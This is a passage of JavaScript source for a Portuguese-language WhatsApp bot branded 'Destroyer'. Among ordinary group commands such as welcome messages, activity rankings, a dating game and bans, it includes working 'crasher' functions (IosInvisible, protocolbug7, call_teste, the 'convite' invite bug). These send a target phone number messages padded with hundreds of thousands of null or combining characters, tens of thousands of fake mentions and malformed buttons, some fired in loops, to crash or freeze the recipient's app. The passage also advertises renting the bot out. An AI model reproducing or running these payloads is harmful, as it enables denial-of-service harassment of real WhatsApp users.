            callLogMesssage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [{
                jid: "0@s.whatsapp.net",
                callOutcome: "1"
              }]
            }
          },
          remoteJid: "0@s.whatsapp.net",
          conversionSource: "source_example",
          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
          conversionDelaySeconds: 10,
          forwardingScore: 99999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ",
            mediaType: "IMAGE",
            jpegThumbnail: thumbnailreply,
            caption: "© 𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ"
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ",
            body: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ" + "\0".repeat(200),
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: thumbnailreply,
            sourceType: "destroyer",
            sourceId: "crasher",
            sourceUrl: "https://whatsapp.com/channel/0029VazrSjKFHWpylIi1IZ3q",
            mediaUrl: "https://whatsapp.com/channel/0029VazrSjKFHWpylIi1IZ3q",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "destroyer_child",
            ref: "ref_crasher"
          },
          entryPointConversionSource: "destroyer_source",
          entryPointConversionApp: "destroyer_app",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "https://whatsapp.com/channel/0029VazrSjKFHWpylIi1IZ3q"
          },
          groupSubject: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ",
          parentGroupJid: "0@g.us",
          trustBannerType: "destroyer_banner",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "destroyer",
            utmCampaign: "crasher"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "0@newsletter",
            serverMessageId: 1,
            newsletterName: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ",
            contentType: "UPDATE",
            accessibilityText: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ"
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbriyuCampaignId: "destroyer_campaign",
          smbServerCampaignId: "crasher_campaign",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, usarParticipante ? {
      participant: { jid: jid }
    } : {});
    }

  } catch (erro) {
    console.error(chalk.red.bold("[!] Erro ao enviar payload:", erro));
    throw erro;
  }
}

async function IosInvisible(target) {
    for (let i = 0; i < 1; i++) {
        await uwu.relayMessage(target, {
            extendedTextMessage: {
                text: '𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ' + "\u0000".repeat(850000),
                contextInfo: {
                    groupMentions: [{ groupJid: "000000000000009@g.us", groupSubject: "⁨🔥" }],
                    stanzaId: "1234567890ABCDEF",
                    participant: "13135550002@s.whatsapp.net",
                    quotedMessage: {
                        callLogMesssage: {
                            isVideo: true,
                            callOutcome: "1",
                            durationSecs: "999999999",
                            callType: "REGULAR",
                            participants: [{ jid: "13135550002@s.whatsapp.net", callOutcome: "1" }]
                        }
                    },
                    remoteJid: target,
                    conversionSource: "source_example",
                    conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                    conversionDelaySeconds: 10,
                    forwardingScore: 9999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "Example Advertiser",
                        mediaType: "IMAGE",
                        jpegThumbnail: thumbnailreply,
                        caption: "@ Você foi mencionado"
                    },
                    placeholderKey: { remoteJid: "13135550002@s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" },
                    expiration: 86400,
                    ephemeralSettingTimestamp: "1728090592378",
                    ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                    externalAdReply: {
                        title: "@ Você foi mencionado",
                        body: "@ Você foi mencionado",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewTtpe: "VIDEO",
                        thumbnail: thumbnailreply,
                        sourceType: " x ",
                        sourceId: " x ",
                        sourceUrl: "https://wa.me/+5569999568598",
                        mediaUrl: "https://wa.me/+5569999568598",
                        containsAutoReply: true,
                        renderLargerThumbnail: true,
                        showAdAttribution: true,
                        ctwaClid: "ctwa_clid_example",
                        ref: "ref_example"
                    },
                    entryPointConversionSource: "entry_point_source_example",
                    entryPointConversionApp: "entry_point_app_example",
                    entryPointConversionDelaySeconds: 5,
                    disappearingMode: {},
                    actionLink: { url: "https://wa.me/+5569999568598" },
                    groupSubject: "Pwq",
                    parentGroupJid: "8888888888888-1234567890@g.us",
                    trustBannerType: "trust_banner_example",
                    trustBannerAction: 1,
                    isSampled: false,
                    utm: { utmSource: "utm_source_example", utmCampaign: "utm_campaign_example" },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "8888888888888-1234567890@g.us",
                        serverMessageId: 1,
                        newsletterName: " X ",
                        contentType: "UPDATE",
                        accessibilityText: "X"
                    },
                    businessMessageForwardInfo: { businessOwnerJid: "0@s.whatsapp.net" },
                    smbClientCampaignId: "smb_client_campaign_id_example",
                    smbServerCampaignId: "smb_server_campaign_id_example",
                    dataSharingContext: { showMmDisclosure: true }
                }
            }
        }, { participant: { jid: target } }); 
    }
}

async function protocolbug7(isTarget) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await uwu.relayMessage("status@broadcast", msg.message, broadcastSend);
}

switch(command) {

case 'teste':
  if(!isCreator) return
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  await IosInvisible(jid)
break

case 'closeuiteste':
  if(!isCreator) return
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  await IosInvisible(jid)
break

case 'ios':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  await enviarPayloadMassivo(jid)
  reply(`Trava ios enviada!\nAguarde 2 minutos para usar novamente`)
break

case "convite":
  if (!isCreator) return;

  const fakeQuoted = {
    key: {
      fromMe: true,
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast"
    },
    message: {
      orderMessage: {
        itemCount: 999999999,
        status: 1,
        surface: 1,
        message: "𝐌𝐇𝐙𝐈𝐍 𝐎𝐖𝐍𝐄𝐑 𝐕𝟐",
        orderTitle: "Bug do Convite",
        sellerJid: "555381121269@s.whatsapp.net",
        thumbnail: thumbnailreply
      }
    }
  };

  const bug = async () => {
    const content = {
      groupInviteMessage: {
        groupName: "𝐑𝐨𝐁𝐨𝐓 𝐂𝐨𝐋𝐋𝐚𝐁" + trava12 + travadoc + trava8,
        groupJid: "6285709664923-1627579259@g.us",
        inviteCode: "h+64P9RhJDzgXSPf",
        inviteExpiration: 999,
        caption: "[ 𝐁𝐔𝐆 ] 🍌 - COLLAB BANANA",
        jpegThumbnail: thumbnailreply
      }
    };

    const msg = await generateWAMessageFromContent(m.chat, content, {
      userJid: m.sender,
      quoted: fakeQuoted
    });

    await uwu.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
  };

  for (let i = 0; i < 6; i++) await bug();
  break;

// case 'conectar': {
//     if (!q) return reply(`❗ Exemplo:\n${prefix + command} 55xxxxxxxxxxx`);

//     const victim = text.split("|")[0];
//     const Xreturn = m.mentionedJid?.[0]
//         ? m.mentionedJid[0]
//         : m.quoted
//         ? m.quoted.sender
//         : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

//     // Verifica se o número está registrado no WhatsApp
//     const contactInfo = await uwu.onWhatsApp(Xreturn);
//     if (!contactInfo || contactInfo.length === 0) {
//         return reply("❌ O número não está registrado no WhatsApp!");
//     }

//     const numeroLimpo = victim.replace(/[^0-9]/g, '');
//     const countryCode = numeroLimpo.slice(0, 3);
//     const prefixxx = numeroLimpo.slice(0, 1);
//     const firstTwoDigits = numeroLimpo.slice(0, 2);

//     // Verificação de número inválido
//     if (
//         countryCode === "252" ||
//         prefixxx === "0" ||
//         firstTwoDigits === "89" ||
//         countryCode.startsWith("85")
//     ) {
//         return reply("⚠️ Números com DDD 252, prefixo 0, começando com 89 ou +85 não são suportados.");
//     }

//     const isValidWhatsAppNumber = (number) => {
//         return number.length >= 10 && number.length <= 15 && !isNaN(number);
//     };

//     if (!isValidWhatsAppNumber(numeroLimpo)) {
//         return reply("❗ Forma incorreta! Exemplo:\n.conectar 5533987123456");
//     }

//     // Recomendação
//     await reply("🔄 Iniciando conexão...\n✅ Recomendado usar WhatsApp normal (original) para melhor estabilidade!");

//     // Iniciar pareamento
//     const startpairing = require('./pairing.js');
//     await startpairing(Xreturn);
//     await sleep(4000);

//     const cu = fs.readFileSync('./pairing/pairing.json', 'utf-8');
//     const cuObj = JSON.parse(cu);

//     if (!cuObj.code) {
//         return reply("❌ Erro ao gerar o código de pareamento. Tente novamente.");
//     }

//     await reply(`📲 Seu código de pareamento:\n\n*${cuObj.code}*`);
//     break;
// }

case 'alugarbot':
case 'alugar':
    try {
        await reagir(from, "💎");        
        const Nk = {
            male: `https://files.catbox.moe/90bkax.jpg`, 
            female: `https://files.catbox.moe/90bkax.jpg`, 
            thirdImage: `https://files.catbox.moe/90bkax.jpg` 
        };

        const maleMedia = await prepareWAMessageMedia({ image: { url: Nk.male } }, { upload: uwu.waUploadToServer });
        const femaleMedia = await prepareWAMessageMedia({ image: { url: Nk.female } }, { upload: uwu.waUploadToServer });
        const thirdMedia = await prepareWAMessageMedia({ image: { url: Nk.thirdImage } }, { upload: uwu.waUploadToServer });

        const carouselMessage = {
            text: "Destroyer",
            cards: [
                {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: maleMedia.imageMessage
                    },
                    headerType: 'IMAGE',
                    body: {
                        text: `✨ 15 Dias de Acesso — Só R$15,00! ✨

Garanta 15 dias de acesso completo por apenas R$15,00!
🔐 Uma solução rápida, segura e econômica para quem precisa de praticidade sem enrolação.

💼 Ideal para usos temporários, com total proteção e estabilidade durante todo o período.
Não perca essa oportunidade de aproveitar muito por tão pouco! 💸`
                    },
                    footer: {
                        text: `${global.botname}`
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"ꜱᴜᴩᴏʀᴛᴇ\",\"url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*15*%20dias%20✅\",\"merchant_url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*15*%20dias%20✅\"}`
                        }]
                    }
                },
                {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: femaleMedia.imageMessage
                    },
                    headerType: 'IMAGE',
                    body: {
                        text: `🌠 30 Dias de Acesso — Apenas R$35,00! 🌠

Tenha 1 mês completo de uso por só R$35,00!
📅 Mais tempo, mais liberdade e muito mais aproveitamento para o que você está alugando.

🔐 Conte com segurança total e uma experiência otimizada, feita pra facilitar sua rotina de forma prática e tranquila.`
                    },
                    footer: {
                        text: `${global.botname}`
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"ꜱᴜᴩᴏʀᴛᴇ\",\"url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*30*%20dias%20✅\",\"merchant_url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*30*%20dias%20✅\"}`
                        }]
                    }
                },
                {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: thirdMedia.imageMessage // Usando a terceira imagem
                    },
                    headerType: 'IMAGE',
                    body: {
                        text: `🌠 60 Dias de Acesso — Só R$65,00! 🌠

Precisa de mais tempo? Então essa é pra você:
🔧 2 meses completos por apenas R$65,00!

Ideal para quem busca uma solução de longo prazo com economia garantida, proteção total e a liberdade de aproveitar tudo com calma e segurança.

🛠️ Mais tempo, mais vantagens, menos preocupações.`
                    },
                    footer: {
                        text: `${global.botname}`
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"ꜱᴜᴩᴏʀᴛᴇ\",\"url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*60*%20dias%20✅\",\"merchant_url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*60*%20dias%20✅\"}`
                        }]
                    }
                }
            ]
        };

        await uwu.relayMessage(from, {
            interactiveMessage: {
                contextInfo: {                    
                    participant: from,
                    quotedMessage: {
                        documentMessage: {
                            contactVcard: true,
                            quoted: EsQl
                        }
                    }
                },
                body: { text: '⏤͟͟͞͞ESTÁ QUERENDO ALUGAR? OLHE A TABELA ABAXO... 🙇‍♂️ ↴' },
                carouselMessage: carouselMessage
            }
        }, {});

    } catch (e) {
        console.log(e);
        await uwu.sendMessage(from, { text: "Ocorreu um erro, tente novamente." }, { quoted: EsQl });
    }
break;

case 'protocolbug':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  for(let i = 0; i < 50; i++) {
    await protocolbug6(jid)
    await protocolbug7(jid)
  }
  await reply(`bug enviado para o alvo!\nAguarde 2minutos para utilizar novamente`)
break

case 'rankativos':
  if (!m.isGroup) return reply(mess.grp);

  const groupId = m.chat;
  const caminhoRank = `./DADOS/rankmensagens/${groupId}.json`;

  if (!fs.existsSync(caminhoRank)) return reply('❌ Nenhuma mensagem foi contabilizada ainda neste grupo.');

  const rankData = JSON.parse(fs.readFileSync(caminhoRank));
  const membrosOrdenados = Object.entries(rankData)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 10);

  const grupoMeta = await uwu.groupMetadata(groupId);
  const participantes = grupoMeta.participants;

  let textoRank = `📊 *Top 10 Mais Ativos no Grupo:*\n\n`;

  for (let i = 0; i < membrosOrdenados.length; i++) {
    const [numero, qtd] = membrosOrdenados[i];
    const userInfo = participantes.find(p => p.id === numero);
    const nome = userInfo?.notify || userInfo?.name || numero.split('@')[0];
    textoRank += `${i + 1}. @${numero.split('@')[0]} — *${qtd}* mensagens\n`;
  }

  await uwu.sendMessage(m.chat, {
    text: textoRank,
    mentions: membrosOrdenados.map(([n]) => n)
  }, { quoted: m });
break;

case 'apg':
case 'd':
case 'apagar':
case 'delete':
  if (!isAdmins) return reply(mess.admin);
  if (!m.quoted) return reply('❌ Marque uma mensagem para apagar.');
  if (!isBotAdmins) return reply(mess.botadm)

  try {
    await uwu.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: false,
        id: m.quoted.id,
        participant: m.quoted.sender
      }
    });
  } catch (e) {
    console.error(e);
    reply('❌ Falha ao apagar a mensagem.');
  }
break;

case 'bemvindo':
  if (!m.isGroup) return reply(mess.grp)
  if (!isAdmins) return reply(mess.admin)
  if (!isBotAdmins) return reply(mess.botadm)
  if (args.length < 1) return reply('Use:\n1 para ativar\n0 para desativar\nOpcional: após 1, escreva a mensagem de boas-vindas')

  const status = Number(args[0])
  const novaMensagem = args.slice(1).join(' ').trim() // texto após o "1"

  if (status === 1) {
    if (isWelkom) return reply('Já está ativo o recurso de boas-vindas neste grupo.')

    dataGp[0].wellcome[0].bemvindo1 = true

    if (novaMensagem) {
      dataGp[0].wellcome[0].legendabv = novaMensagem
    } else if (!dataGp[0].wellcome[0].legendabv) {
      // Mensagem padrão, caso não tenha nada definido
      dataGp[0].wellcome[0].legendabv = "Olá @usuario, seja bem-vindo(a) ao grupo! 🎉"
    }

    setGp(dataGp)
    reply('🌀 Recurso de boas-vindas ativado com sucesso neste grupo 📝')
    if (novaMensagem) reply('💬 Mensagem de boas-vindas atualizada.')
  } else if (status === 0) {
    if (!isWelkom) return reply('Já está desativado o recurso de boas-vindas.')

    dataGp[0].wellcome[0].bemvindo1 = false
    setGp(dataGp)
    reply('‼️ Recurso de boas-vindas desativado com sucesso neste grupo ✔️')
  } else {
    reply('Use 1 para ativar ou 0 para desativar o recurso.')
  }
break

case 'namorar':
// @Matheus
setTimeout(() => {
    reagir(from, "💍")
}, 300)
if (!m.isGroup) return reply(mess.grp)
if (!menc_os2) return reply('Marque a mensagem ou o @ que queira pedir ela em namoro. Se você tomar um fora, juízo!')
if (botNumber.includes(menc_os2)) return reply("💍 Ei! Eu sou só um bot... já tenho um compromisso sério com a programação 🤖❤️\n\nDesculpa, mas meu coração já está ocupado por linhas de código e loops infinitos! 😅💔")
if (JSON.stringify(namoro2).includes(menc_os2)) return reply("💘 Alguém já teve essa brilhante ideia antes!\n\nEsse usuário já foi pedido em namoro... talvez ainda esteja pensando na resposta ou curtindo o momento! 💭💕")
if (JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == false) return reply(`💔 Ei, ${pushname}...\nParece que seu coração já escolheu alguém antes! 😕\n\nVocê já fez um pedido de namoro e está aguardando a resposta ou já está comprometido(a). Não dá pra jogar com sentimentos, né? 💌`)
if (JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == true) return reply(`🚫 Ops, não vai rolar, ${pushname}...\nEssa pessoa já está comprometida e seu coração já tem dono(a)! 💔🌚`)
if (JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == false) return mention(`💌 Você já pediu para namorar com @${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}. Por favor, não brinque com os sentimentos alheios! Decida-se logo ou cancele o pedido com: *${prefix}cancelarpedido*.`)
if (JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == true) return mention(`💖 Você já está namorando com a(o) @${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}! Que continuem sempre juntos e felizes! 🌹`)
namoro1.push({
    usu1: sender,
    usu2: menc_os2.split('@')[0],
    namorados: false,
    idgp: from,
    hora: hora,
    data: date
})
fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.push({
    id: menc_os2,
    pedido: sender.split('@')[0],
    idgp: from
})
fs.writeFileSync("./DADOS/database/namoro2.json", JSON.stringify(namoro2))
mention(`💘 *Um Momento Mágico Está Acontecendo...* 💫\n\n🌹 *@${sender.split('@')[0]}* tomou coragem, reuniu os sentimentos mais sinceros e decidiu abrir o coração para você, *@${menc_os2.split('@')[0]}*.\n\n💞 Com muito carinho, ele(a) te faz um pedido especial:\n\n👩‍❤️‍👨 *Você aceita namorar comigo?*\n\n📩 Responda com: _sim_ ou _não_ 💌\n\n✨ Que o amor floresça onde há sinceridade. ✨`)
break

case 'cancelarpedido':
// @Matheus
if (!m.isGroup) return reply(mess.grp)
if (!JSON.stringify(namoro1).includes(sender)) return reply("Não há pedido de namoro para cancelar.")
C13 = namoro1.map(i => i.usu1).indexOf(sender)
C15 = namoro2.map(i => i.id).indexOf(namoro1[C13].usu2 + "@s.whatsapp.net")
if (namoro1[C13].namorados == true) return reply("Não é possível cancelar o pedido de namoro depois de aceito.")
namoro1.splice(C13, 1)
fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C15, 1)
fs.writeFileSync("./DADOS/database/namoro2.json", JSON.stringify(namoro2))
reply("Pedido de namoro cancelado com sucesso.")
break

case 'terminar_namoro': {
    const index1 = namoro1.findIndex(i => i.usu1 === sender && i.namorados)
    if (index1 === -1) return reply(`Você não está namorando com ninguém. Sinto muito!`)

    const parceiro = `${namoro1[index1].usu2}@s.whatsapp.net`

    // Avisa o parceiro
    uwu.sendMessage(parceiro, {
        text: `💔 *Notícia Triste...*\n\nSeu parceiro(a) acaba de colocar um ponto final no relacionamento com você.\n\n🕊️ *"Nem todo adeus é falta de amor, às vezes é excesso de dor."*\n\n🌸 Guarde os bons momentos no coração e siga em frente com leveza. A vida continua, e o amor pode florescer novamente. 🥀`
    }, {
        quoted: seloMeta
    })

    reply(`
💔 *Término Confirmado!* 💔

Você decidiu seguir um novo caminho...  
Agora está oficialmente *solteiro(a)*.

🧘 Respire fundo, cuide de si,  
e lembre-se: *o amor próprio sempre vem em primeiro lugar.* ✨

🔮 Que novos começos venham com boas histórias!
`)

    const index2 = namoro1.findIndex(i => i.usu1 === parceiro && i.usu2 === sender.split('@')[0])

    if (index2 !== -1) {
        namoro1.splice(index2, 1)
    }

    namoro1.splice(index1, 1)
    fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))

    // Remover do namoro2 também
    const indexPedido1 = namoro2.findIndex(n => n.pedido === sender.split('@')[0])
    if (indexPedido1 !== -1) namoro2.splice(indexPedido1, 1)

    const indexPedido2 = namoro2.findIndex(n => n.pedido === parceiro.split('@')[0])
    if (indexPedido2 !== -1) namoro2.splice(indexPedido2, 1)

    fs.writeFileSync("./DADOS/database/namoro2.json", JSON.stringify(namoro2, null, 2))
}
break

case 'dupla': {
    if (!m.isGroup) return reply(mess.grp)

    const D1 = namoro1.findIndex(i => i.usu1 === sender)
    if (D1 === -1) return reply(`💔 *Nada por aqui...*\n\nVocê não está namorando com ninguém no momento. 😢\n\n🌱 Mas tudo bem... O amor aparece quando a gente menos espera. Seja paciente e cuide bem do seu coração! ❤️`)
    
    if (!namoro1[D1].namorados) {
        return reply(`💔 *Pedido Pendente...*\n\nA pessoa que você pediu em namoro ainda *não aceitou* o pedido. 😔\n\n⏳ Aguarde pacientemente ou tente conversar com ela para entender o que houve.\n\n📌 Enquanto isso, não é possível consultar os dados da dupla.`)
    }

    reagir(from, "🐲")

    const parceiro = namoro1[D1].usu2.includes('@') ? namoro1[D1].usu2 : `${namoro1[D1].usu2}@s.whatsapp.net`

    const txt = `
╭━━━━━━━💖━━━━━━━╮
  💑 *Dupla Encontrada com Sucesso!*
╰━━━━━━━💖━━━━━━━╯

✨ *Casal Formado:*
@${sender.split('@')[0]}  
❤️  
@${parceiro.split('@')[0]}

📅 *Desde:* *${namoro1[D1].data}*
🕒 *Hora do Pedido:* *${namoro1[D1].hora}*

💌 *Esse casal está unido pelo destino...*  
*Que o amor, o respeito e as figurinhas engraçadas estejam sempre presentes!* 💞

🔚 *Para encerrar esse relacionamento:*  
✂️ Use o comando: *${prefix}terminar_namoro*
`

    await uwu.sendMessage(m.chat, {
        text: txt,
        mentions: [sender, parceiro]
    }, {
        quoted: m
    })
}
break

case 'call_teste':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  try {
    const sendCorruptedMessage = async () => {
      try {
        await uwu.relayMessage(jid, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: {
                body: {
                  text: "\u0300 – \u036F" + "ꦾ".repeat(60000)
                },
                nativeFlowMessage: {
                  buttons: [
                    { name: "single_select", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' }
                  ]
                },
                contextInfo: {
                  stanzaId: uwu.generateMessageTag(),
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: EsQl,
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    "120363025003560808@g.us",
                    "server@s.whatsapp.net",
                    "status@broadcast",
                    jid,
                    "999999999999999@s.whatsapp.net",
                    "spam@broadcast",
                    "whatsapp@broadcast",
                    "unknown@s.whatsapp.net"
                  ],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: m.chat
                  }
                },
                body: {
                  text: 'ꦾ'.repeat(100000)
                },
                nativeFlowMessage: {
                  buttons: [
                    { name: "single_select", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "mpm", buttonParamsJson: '' },
                    { name: "mpm", buttonParamsJson: '' }
                  ]
                }
              }
            }
          }
        }, {
          participant: { jid: jid }
        });
      } catch (err) {
        console.log("Erro ao enviar mensagem corrompida:", err);
      }
    };

    for (let i = 0; i < 1; i++) {
      await sendCorruptedMessage();
      delay(3000)
    }
    reply(`Crash enviado`)

  } catch (err) {
    console.log("Erro no crash_home:", err);
  }
break

case 'correio':
  if (!q.includes('/')) return reply(`📩 Exemplo de uso:\n${prefix}correio 558198923680/Oi Amor, sdds`)

  const partes = q.trim().split('/')
  if (partes.length < 2) return reply('❌ Use no formato correto: número/mensagem')

  const numero = partes[0].replace(/\D/g, '')
  const mensagemTexto = partes.slice(1).join('/').trim()

  if (!numero || !mensagemTexto) return reply('❌ Número ou mensagem inválidos.')

  const [result] = await uwu.onWhatsApp(numero)
  if (!result || !result.exists) return reply('❌ Esse número não está registrado no WhatsApp.')

  const mensagem = 
`╭┄━┄━┄━┄━┄━╮
┞┧ ⸙. ͎۪۫          💌  ː͡₊ꞋꞌꞋꞌ
┞┧Correio anônimo
┞┧Msg: ${mensagemTexto}
╰┄━┄━┄━┄━┄━╯`

  await uwu.sendMessage(result.jid, { text: mensagem })
  reply(`✅ Mensagem enviada com sucesso para o número: ${numero}`)
break

case 'totag': {
  if (!m.isGroup) return reply(mess.grp)
  if (!isAdmins) return reply(mess.admin)

  const mentions = participants.map(p => p.id)
  const totalMembros = participants.length

  const texto =  `
╭─❍ *TOTAG* ❍─╮
│  *Mensagem do adm:* ${text?.trim() || 'Nenhuma mensagem'}
│  Olá, pessoal! 📢  
│  Foram marcados *${totalMembros}* membros!
│  Vai que é algo importante! 👀
╰───────────────╯
  `.trim()

  await uwu.sendMessage(m.chat, {
    text: texto,
    mentions
  }, {
    quoted: m
  })
}
break

case 'ban':
  if (!m.isGroup) return reply(mess.grp)
  if (!isBotAdmins) return reply(mess.botadm)
  if (!isAdmins) return reply(mess.admin)

  if (m.mentionedJid.length === 0) return reply('❌ Marque o usuário que você quer banir.')

  const target = m.mentionedJid[0]

  if (target === botNumber + '@s.whatsapp.net') {
    return reply('🚫 Não posso banir a mim mesmo.')
